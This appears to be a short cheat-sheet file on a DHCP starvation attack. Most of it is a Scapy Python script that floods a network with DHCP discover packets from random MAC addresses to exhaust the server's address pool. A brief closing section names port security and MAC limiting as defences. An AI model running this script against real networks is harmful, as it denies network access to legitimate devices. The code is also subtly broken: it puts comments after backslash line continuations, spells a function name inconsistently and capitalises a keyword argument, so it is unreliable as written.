### DHCP STARVATION ATTACK ###
#
## Most easily achieved with a quick python script like the below
## Will allocate as many of the IP addresses as possible (available) from the
## target DHCP server to random MAC address until the pool of IPs is exhausted
## so that no new devices on the network will be able to receive an IP address

from scapy.all import *

conf.checkIPaddr = False #Turn off IP address checking

#Craft packet:
discov = Ether(dst='ff:ff:ff:ff:ff:ff',src=RandMAC())  \ #Randomize MAC address
          /IP(src='0.0.0.0',dst='255.255.255.255') \ #Broadcast destination
          /UDP(dport=67,sport=68) \ #DHCP client/server specification
          /BOOTP(op=1,chaddr = RandMac()) \
          /DHCP(options=[('message-type','discover'),('end')])

sendp(discov,iface='eth0',Loop=1,verbose=1) #Send the crafted packet, looping, with verbose output

### PROTECTING AGAINST THIS ATTACK ###
#
## Your best option is use port security and/or configure MAC limiting
## see more here: https://www.juniper.net/documentation/software/topics/example/port-security-protect-from-dhcp-starvation-attack.html
